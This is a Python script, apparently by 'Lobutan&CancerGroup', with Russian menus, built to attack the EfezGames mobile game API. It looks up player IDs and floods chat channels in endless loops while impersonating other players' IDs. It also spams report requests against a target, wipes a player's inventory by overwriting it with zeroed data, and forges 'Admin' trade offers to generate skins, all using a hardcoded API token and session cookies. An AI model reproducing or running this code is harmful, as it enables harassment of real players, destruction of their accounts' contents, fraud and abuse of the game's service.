# type: ignore
import requests
import urllib.parse
import time
script_name = [
" ▓█████  ███▄    █   ██████  ██▓     ▄▄▄       ██▒   █▓▓█████ ▓█████▄     ██▓     ▒█████   ▄▄▄▄    █    ██ ▄▄▄█████▓ ▄▄▄       ███▄    █  ",
" ▓█   ▀  ██ ▀█   █ ▒██    ▒ ▓██▒    ▒████▄    ▓██░   █▒▓█   ▀ ▒██▀ ██▌   ▓██▒    ▒██▒  ██▒▓█████▄  ██  ▓██▒▓  ██▒ ▓▒▒████▄     ██ ▀█   █  ",
" ▒███   ▓██  ▀█ ██▒░ ▓██▄   ▒██░    ▒██  ▀█▄   ▓██  █▒░▒███   ░██   █▌   ▒██░    ▒██░  ██▒▒██▒ ▄██▓██  ▒██░▒ ▓██░ ▒░▒██  ▀█▄  ▓██  ▀█ ██▒ ",
" ▒▓█  ▄ ▓██▒  ▐▌██▒  ▒   ██▒▒██░    ░██▄▄▄▄██   ▒██ █░░▒▓█  ▄ ░▓█▄   ▌   ▒██░    ▒██   ██░▒██░█▀  ▓▓█  ░██░░ ▓██▓ ░ ░██▄▄▄▄██ ▓██▒  ▐▌██▒ ",
" ░▒████▒▒██░   ▓██░▒██████▒▒░██████▒ ▓█   ▓██▒   ▒▀█░  ░▒████▒░▒████▓    ░██████▒░ ████▓▒░░▓█  ▀█▓▒▒█████▓   ▒██▒ ░  ▓█   ▓██▒▒██░   ▓██░ ",
" ░░ ▒░ ░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░ ▒░▓  ░ ▒▒   ▓▒█░   ░ ▐░  ░░ ▒░ ░ ▒▒▓  ▒    ░ ▒░▓  ░░ ▒░▒░▒░ ░▒▓███▀▒░▒▓▒ ▒ ▒   ▒ ░░    ▒▒   ▓▒█░░ ▒░   ▒ ▒  ",
"  ░ ░  ░░ ░░   ░ ▒░░ ░▒  ░ ░░ ░ ▒  ░  ▒   ▒▒ ░   ░ ░░   ░ ░  ░ ░ ▒  ▒    ░ ░ ▒  ░  ░ ▒ ▒░ ▒░▒   ░ ░░▒░ ░ ░     ░      ▒   ▒▒ ░░ ░░   ░ ▒░ ",
"    ░      ░   ░ ░ ░  ░  ░    ░ ░     ░   ▒        ░░     ░    ░ ░  ░      ░ ░   ░ ░ ░ ▒   ░    ░  ░░░ ░ ░   ░        ░   ▒      ░   ░ ░  ",
"    ░  ░         ░       ░      ░  ░      ░  ░      ░     ░  ░   ░           ░  ░    ░ ░   ░         ░                    ░  ░         ░  ",
"                                                   ░           ░                                ░                                         ",
"Script made by Lobutan&CancerGroup"]
import re
import requests
import json
import base64

def get_user_id(nickname, chat_region="RU", keyword=None):
    """
    Получает ID пользователя по нику или ключевому слову в чате
    
    :param nickname: Никнейм пользователя или хеш (начинается с #)
    :param chat_region: Регион чата для поиска по ключевому слову (RU, DE, US, PL, PREMIUM)
    :param keyword: Ключевое слово для поиска в чате (если ник недоступен)
    :return: ID пользователя или сообщение об ошибке
    """
    # Если указано ключевое слово, ищем в чате
    if keyword:
        return _get_id_from_chat(keyword, chat_region)
    
    # Обработка хеша (начинается с #)
    if nickname.startswith('#'):
        try:
            first = int(nickname[1:3], 16)
            second = int(nickname[3:5], 16)
            third = int(nickname[5:], 16)
            numeric_id = str(first * 256 * 256 + second * 256 + third)
            return _fetch_user_id(f"ID={numeric_id}")
        except (ValueError, IndexError):
            return "error: invalid hash format"
    
    # Обработка русского ника
    if _has_cyrillic(nickname):
        try:
            encoded_nick = base64.b64encode(nickname.encode('utf-8')).decode('utf-8')
            return _fetch_user_id(f"nick=@{encoded_nick}")
        except:
            return "error: encoding failed"
    
    # Обработка обычного ника
    return _fetch_user_id(f"nick={nickname}")

def _has_cyrillic(text):
    """Проверяет, содержит ли текст кириллические символы"""
    return bool(re.search('[а-яА-Я]', text))

def _fetch_user_id(query):
    """Получает ID пользователя через API"""
    url = f"https://api.efezgames.com/v1/social/findUser?{query}"
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        data = response.json()
        return str(data["_id"])
    except (requests.RequestException, json.JSONDecodeError, KeyError):
        return "error: user not found or API error"

def _get_id_from_chat(keyword, chat_region):
    """Ищет ID пользователя по ключевому слову в чате"""
    url = f"https://api-project-7952672729.firebaseio.com/Chat/Messages/{chat_region}.json?orderBy=\"ts\"&limitToLast=20"
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        messages = response.json()
        
        for message_id in messages:
            msg_data = messages[message_id]
            if (keyword.lower() in msg_data.get('msg', '').lower() or 
                keyword.lower() in msg_data.get('nick', '').lower()):
                return msg_data.get('playerID', 'error: ID not found in message')
        
        return "error: user with this keyword not found in last 20 messages"
    except requests.RequestException:
        return "error: chat API unavailable"
    except json.JSONDecodeError:
        return "error: invalid chat response"

# Примеры использования:
if name == "__main__":
    # По нику
    print(get_user_id("PlayerNick"))  # Обычный ник
    print(get_user_id("#A1B2C3"))     # Хеш
    print(get_user_id("Игрок"))       # Русский ник
    
    # По ключевому слову в чате
    print(get_user_id(None, chat_region="RU", keyword="привет"))
def reporter(player_id):
    reported_user = str(player_id)
    reason = "1"
    url = f"https://api.efezgames.com/v1/users/reportUser?reportedUser={reported_user}&submitter={reported_user}&reason={reason}"
    headers = {
        "User-Agent": "UnityPlayer/2021.3.45f1",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "X-Unity-Version": "2021.3.45f1"
    }
    delay = 1  
    print("[✓] стартуем спам репортами...")
    while True:
        try:
            response = requests.get(url, headers=headers)
            print(f"[+] репорт отправлен | код: {response.status_code} | ответ: {response.text}")
            time.sleep(delay)
        except Exception as e:
            print(f"[×] ошибка: {e}")
            time.sleep(3)
        a = input("Введите *home* если хотите вернуться в меню \n ")
        if a == "home":
             menu()
        return player_id

def nuke_by_Lobutan(player_id, nick):
    
    url = "https://api.efezgames.com/v1/equipment/sendEQ"

    data = {
        "playerID": str(player_id),
        "data": "0;0;0;0;0;0;0;0;0;0;0",
        "favouriteSkins": "0",
        "stats": "0",
        "description": "<color=red><size=30>NUK3D BY WallTakerLobutan",
        "agentsForLevelAdded": "0",
        "favouriteModes": "mysteryCase,gallery,esports2014;upgrader,revolver,crash",
        "eqValue": 0, 
        "internalID": 3297273,
        "country": "RU",
        "nick": str(nick),
        "premium": True,
        "version": "2.17.0",
        "blockedUsers": "a_8404302628029308629",
        "onesignalid": "ca9fbd6a-f7a4-47c7-9ed6-b9ae98b140a6"
    }

    try:
        response = requests.post(url, json=data)
        print(f"Статус-код: {response.status_code}")
        print(f"Ответ: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Ошибка запроса: {e}")
    return player_id, nick
def create_trade_offer(ID_2,skins_id):
        ID = ID_2
        skins = str(skins_id)
        Nick = "Admin"
        Frame = "lP" 
        Avatar = "defaultAvatar"
        OneSignal = "123"
        S_OneSignal = "123"
        Version = "2.38.0"
        message = "Script made by Lobutan&CancerGroup"
        url = (
            f"https://api.efezgames.com/v1/trades/createOffer?"
            f"token={urllib.parse.quote('H3Iscpxiwrae308TiMuP')}&"
            f"playerID={urllib.parse.quote(ID)}&"
            f"receiverID={urllib.parse.quote(ID)}&"
            f"senderNick={urllib.parse.quote(Nick)}&"
            f"receiverNick={urllib.parse.quote(Nick)}&"
            f"senderFrame={urllib.parse.quote(Frame)}&"
            f"receiverFrame={urllib.parse.quote(Frame)}&"
            f"senderAvatar={urllib.parse.quote(Avatar)}&"
            f"receiverAvatar={urllib.parse.quote(Avatar)}&"
            f"skinsOffered={urllib.parse.quote(skins)}&"
            f"skinsRequested={urllib.parse.quote(skins)}&"
            f"message={urllib.parse.quote(message)}&"
            f"pricesHash={urllib.parse.quote('fbd9aec4384456124c0765581a4ba099')}&"
            f"senderOneSignal={urllib.parse.quote(S_OneSignal)}&"
            f"receiverOneSignal={urllib.parse.quote(OneSignal)}&"
            f"senderVersion={urllib.parse.quote(Version)}&"
            f"receiverVersion={urllib.parse.quote(Version)}"
        )
        headers = {
            "User-Agent": "UnityPlayer/2021.3.45f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
            "Accept": "*/*",
            "Accept-Encoding": "deflate, gzip",
            "X-Unity-Version": "2021.3.45f1",
            "Cookie": "ARRAffinitySameSite=db1c4fc504e7f8b96f7a4eb3e31768b893b3a60431cd496cd8b52be5ea0f6563; ARRAffinity=db1c4fc504e7f8b96f7a4eb3e31768b893b3a60431cd496cd8b52be5ea0f6563"
        }
        try:
            response = requests.get(url, headers=headers)
            print(f"Trade offer created. Status: {response.status_code}")
            print(f"Response: {response.text}")
        except Exception as e:
            print(f"Error: {e}")
        a = input("Введите *home* если хотите вернуться в меню \n ")
        if a == "home":
             menu()
        return ID_2, skins_id
            
def chatkiller(id, text, canal):
            url = "https://api.efezgames.com/v1/social/sendChat"
            params = {
                "playerID": id,
                "token": "H3Iscpxiwrae308TiMuP",
                "message": text,
                "channel": canal  
            }
            headers = {
                "User-Agent": "UnityPlayer/2021.3.45f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",  
                "Accept": "*/*",  
                "Accept-Encoding": "deflate, gzip",  
                "Cookie": "ARRAffinitySameSite=...; ARRAffinity=...",  
                "X-Unity-Version": "2021.3.45f1"  
            }
            response = requests.get(url, params=params, headers=headers)
            print(response.status_code)
            print(response.text)
for element in script_name:
    print(element) 
def menu():
    print(" \n \n \n = N1 - Рейд чата  \n  N2 - Генерация скинов (нужен айди игрока) \n N3 - Снос инвентаря (нужен айди игрока)  \n  N4 - Репорт спам (нужен айди игрока) \n A - Авторы \n Для выбора напишите номер слева от действия ")
    answer = input()
    if answer == "N1":
        password = "1422"
        print("Пароль:")
        answer_2 = input()
        if answer_2 == "1422":
            print("Добро пожаловать в лабораторию для рейда \n  Какое сообщение вы хотите использовать?")
            text = input()
            print("В каком канале вы хотите утроить рейд? (существует 7 каналов RU, US, PL, DE, UA, PREMIUM, DEV)")
            canal = input()
            id = "122121336020797687"
            print("Вы действительно хотите запустить рейд? ДА/НЕТ")
            answer_3 = input()
            if answer_3 == "да" or "ДА":
                print("Рейд успешно активирован")
                if answer_3 == answer_3:
                    while True:
                        chatkiller("122121336020797687", text, canal)
                        chatkiller("a_3459346222858753227", text, canal)
                        chatkiller("a_240409054565722061", text, canal)
                        chatkiller("a_4757986116600856877", text, canal)
                        chatkiller("a_1745619470844979010", text, canal)
                        chatkiller("a_7236677574949371678", text, canal)
                        chatkiller("a_5365237086076279739", text, canal)
                        chatkiller("a_1991093782538651987", text, canal)
                        chatkiller("a_3655910887482628167", text, canal)
                        chatkiller("a_2259309514969211365", text, canal)
                        chatkiller("a_991347088968628798", text, canal)
                        chatkiller("a_122101683962834553", text, canal)
                        chatkiller("a_311331950556864", text, canal)
                        chatkiller("a_7299404239158636273", text, canal)
                        chatkiller("a_8064619460722341145", text, canal)
                        chatkiller("a_8097807680255908265", text, canal)
                        chatkiller("a_4818199513910212742", text, canal)
                        chatkiller("a_7341103416253891008", text, canal)
                        chatkiller("a_1330780739946305681", text, canal)
                        chatkiller("a_4800476943367061569", text, canal)
                        chatkiller("a_3012857873211791950", text, canal)
                        chatkiller("a_3236647124065394229", text, canal)
                        chatkiller("a_3459346222858753227", text, canal)
                        chatkiller("a_240409054565722061", text, canal)
                        chatkiller("a_4757986116600856877", text, canal)
                        chatkiller("a_1745619470844979010", text, canal)
                        chatkiller("a_7236677574949371678", text, canal)
                        chatkiller("a_5365237086076279739", text, canal)
                        chatkiller("a_1991093782538651987", text, canal)
                        chatkiller("a_3655910887482628167", text, canal)
                        chatkiller("a_2259309514969211365", text, canal)
                        chatkiller("a_991347088968628798", text, canal)
                        chatkiller("a_122101683962834553", text, canal)
                        chatkiller("a_311331950556864", text, canal)
        else:
             print("ДОСТУП ЗАПРЕЩЕН")
             menu()
    if answer == "N2":
        password = "1422"
        print("Пароль:")
        answer_2 = input()
        if answer_2 == "1422":
              trade = [str(input("Введите айди скина "))]
              create_trade_offer(input("Введите айди аккаунта "),trade)
        else:
             print("ДОСТУП ЗАПРЕЩЕН")
             menu()
    if answer == "N3":
         password = "1422"
         print("Пароль:")
         answer_2 = input()
         if answer_2 == "1422":
              print("Добро пожаловать в лабораторию нюка")
              nick = [input("Введите айди игрока ")]
              player_id = [input("Какой ник поставить цели? ")]
              nuke_by_Lobutan(player_id,nick)
         else:
             print("ДОСТУП ЗАПРЕЩЕН")
             menu() 
    if answer == "N4":
         password = "1422"
         answer_2 = input("Пароль:")
         if answer_2 == "1422":
              print("Добро пожаловать в рабораторию репорт спама")
              reporter(input("Введите айди игрока "))
         else:
            print("ДОСТУП ЗАПРЕЩЕН")
            menu()
    if answer == "A":
         print("noncmnt - Снос инвентаря, Репорт спам \n WallTakerLobutan - Генератор скинов, Рейд чата, Оформление скрипта \n Что бы вернуться в меню напишите *home* )")
         home = input()
         if home == "home":
              menu()
    if answer == "N0":
        print("Пароль:")
        password = "1422"
        answer_2 = input()
    if answer_2 == "1422":
        print("Добро пожаловать в лабораторию по поиску айди игрока")
        get_user_id(nickname = input("НикНейм игрока"), chat_region = input("В каком чате искать игрока? "), keyword = input("По какому сообщению искать игрока? "))
menu()